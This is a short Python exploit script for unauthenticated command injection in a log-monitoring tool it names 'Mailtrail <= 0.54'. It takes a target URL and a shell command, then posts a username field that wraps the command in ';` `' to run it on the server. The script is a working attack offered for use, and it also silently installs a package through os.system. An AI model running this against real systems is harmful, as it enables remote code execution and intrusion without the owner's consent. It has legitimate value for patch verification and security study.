#!/usr/bin/python3

import requests
import argparse
import os
try:
    from pwn import log
except:
    os.system('/usr/bin/python3 -m pip install pwn')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Mailtrail <= 0.54 Unauthenticated Command Injection')
    parser.add_argument('-u', '--url', help='URL')
    parser.add_argument('-c', '--command', help='Command to execute')
    args = parser.parse_args()
    if args.url and args.command:
        r = requests.post(args.url, data={'username': f';`{args.command}`'})
    else:
        log.error('Missing arguments!')